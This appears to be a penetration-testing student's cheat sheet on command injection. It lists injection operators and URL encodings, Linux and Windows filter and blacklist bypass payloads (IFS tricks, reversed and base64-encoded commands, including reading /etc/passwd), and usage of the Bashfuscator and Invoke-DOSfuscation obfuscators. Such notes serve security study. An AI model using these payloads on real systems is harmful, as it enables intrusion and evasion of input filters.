# Command Injections

[PayloadAllTheThings Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

## Injection Operators

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
|--------------------|---------------------|-----------------------|------------------|
| Semicolon | ; | %3b | Both |
| New Line | \n | %0a | Both |
| Background | & | %26 | Both (second output generally shown first) |
| Pipe | \| | %7c | Both (only second output is shown) |
| AND | && | %26%26 | Both (only if first succeeds) |
| OR | \|\| | %7c%7c | Second (only if first fails) |
| Sub-Shell | `` | %60%60 | Both (Linux-only) |
| Sub-Shell | $() | %24%28%29 | Both (Linux-only) |

## Linux

### Filtered Character Bypass

| Code | Description |
|------|-------------|
| `printenv` | Can be used to view all environment variables |
| **Spaces** | |
| `%09` | Using tabs instead of spaces |
| `${IFS}` or `$IFS` | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) |
| `{ls,-la}` | Bash brace exspansion (commas will be replaced with spaces) |
| **Other Characters** | |
| `${PATH:0:1}` | Will be replaced with / |
| `${LS_COLORS:10:1}` | Will be replaced with ; |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one "[" (91) -> "\\" (92) |

### Blacklisted Command Bypass

| Code | Description |
|------|-------------|
| **Character Insertion** | |
| `' or "` | Total must be even example: `c"a"t` |
| `$@ or \` | Linux only |
| **Case Manipulation** | |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Execute command regardless of cases (may need to replace spaces with tabs `%09`) |
| `$(a="WhOaMi";printf %s "${a,,}")` | Another variation of the technique |
| **Reversed Commands** | |
| `echo 'whoami' | rev` | Reverse a string |
| `$(rev<<<'imaohw')` | Execute reversed command |
| **Encoded Commands** | |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64` | Encode a string with base64 |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string |

## Windows

### Filtered Character Bypass

| Code | Description |
|------|-------------|
| `Get-ChildItem Env:` | Can be used to view all environment variables - (PowerShell) |
| **Spaces** | |
| `%09` | Using tabs instead of spaces |
| `%PROGRAMFILES:~10,-5%` | Will be replaced with a space - (CMD) |
| `$env:PROGRAMFILES[10]` | Will be replaced with a space - (PowerShell) |
| **Other Characters** | |
| `%HOMEPATH:~0,-17%` | Will be replaced with \ - (CMD) |
| `$env:HOMEPATH[0]` | Will be replaced with \ - (PowerShell) |

### Blacklisted Command Bypass

| Code | Description |
|------|-------------|
| **Character Insertion** | |
| `' or "` | Total must be even |
| `^` | Windows only (CMD) |
| **Case Manipulation** | |
| `WhoAmi` | Simply send the character with odd cases |
| **Reversed Commands** | |
| `"whoami"[-1..-20] -join ''` | Reverse a string |
| `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed command |
| **Encoded Commands** | |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode a string with base64 |
| `echo -n whoami \| iconv -f utf-8 -t utf-16le \| base64` | Base 64 encode with linux to be decoded on windows |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string |

## Evasion Tools

### Linux (Bashfuscator)

https://github.com/Bashfuscator/Bashfuscator

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
cd ./bashfuscator/bin/
./bashfuscator -h ## show help screen
./bashfuscator -c 'cat /etc/passwd' ## random choice obfuscation technique
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 ## short and simple obfuscated command
```

### Windows (DOSfuscation)

https://github.com/danielbohannon/Invoke-DOSfuscation

```PowerShell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
Invoke-DOSfuscation> help ## show help screen
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1 ## encode type 1 
```

Run windows powershell on linux with [pwsh](https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-linux?view=powershell-7.5)

